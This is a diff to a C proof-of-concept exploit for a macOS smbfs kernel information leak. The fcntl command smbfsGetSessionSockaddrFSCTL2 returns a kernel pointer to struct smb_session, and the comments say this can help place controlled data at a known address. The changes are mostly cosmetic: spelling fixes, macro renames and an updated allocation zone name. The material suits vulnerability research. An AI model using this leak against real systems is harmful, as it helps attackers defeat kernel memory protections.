@@ -23,9 +23,9 @@
 
 
 ///
-/// The `smbfsGetSessionSockaddrFSCTL2` fcntl command is used by userland process to
+/// The `smbfsGetSessionSockaddrFSCTL2` fcntl command is used by user land process to
 /// retreive the original SMB server IP address that was used to setup the connection with the
-/// SMB server. This fcntl command is handled by the method  `smbfs_vnop_ioctl` defined in
+/// SMB server. This `fcntl` command is handled by the method  `smbfs_vnop_ioctl` defined in
 /// `smbfs_vnops.c` as shown below :-
 ///
 /// static int32_t smbfs_vnop_ioctl(struct vnop_ioctl_args *ap)
@@ -38,8 +38,8 @@
 ///         case smbfsGetSessionSockaddrFSCTL2: {
 ///             struct smbSockAddrPB *pb = (struct smbSockAddrPB *) ap->a_data;
 ///
-///             // ***NOTE***: The pointer to `struct smb_session` is assigned to pb->sessionp
-///             // The `struct smbSockAddrPB *pb` will be copied back to userland by `sys_fcntl_nocancel`
+///             // ***NOTE***: The pointer to `struct smb_session` is assigned to `pb->sessionp`
+///             // The `struct smbSockAddrPB* pb` will be copied back to userland by `sys_fcntl_nocancel`
 ///             // after the `smbfs_vnop_ioctl` returns
 ///             pb->sessionp = sessionp;
 ///
@@ -60,7 +60,7 @@
 /// As noted in the code snippet above, the address of associated `struct smb_session` is
 /// returned to the userland. Userland process may provide this value with the `SMBIOC_NEGOTIATE`
 /// ioctl command to reuse a existing smb_session while mounting multiple shares from the same
-/// SMB server*. The `struct smb_session` is of size 1296 and is allocated on kext.1664 zone.
+/// SMB server*. The `struct smb_session` is of size 1296 and is allocated on default.1664 zone.
 /// This information disclosure vulnerability may be used in exploits to allocate kernel memory
 /// with controlled data at known address etc.
 ///
@@ -108,8 +108,8 @@ int main(int argc, const char * argv[]) {
     bzero(&smb_addr, sizeof(smb_addr));
     smb_addr.sin_family = AF_INET;
     smb_addr.sin_len = sizeof(smb_addr);
-    smb_addr.sin_port = htons(xpl_SMBX_PORT);
-    inet_aton(xpl_SMBX_HOST, &smb_addr.sin_addr);
+    smb_addr.sin_port = htons(XPL_SMBX_PORT);
+    inet_aton(XPL_SMBX_HOST, &smb_addr.sin_addr);
     
     /// STEP 2: Setup a new SMB session
     struct smbioc_negotiate negotiate_req;
@@ -182,7 +182,7 @@ int main(int argc, const char * argv[]) {
         exit(1);
     }
     
-    printf("[INFO] leaked pointer %p to smb_session in kext.1664 zone\n", sockaddr_pb.sessionp);
+    printf("[INFO] leaked pointer %p to smb_session in default.1664 zone\n", sockaddr_pb.sessionp);
     
     close(root_fd);
     unmount(mount_path, MNT_FORCE);
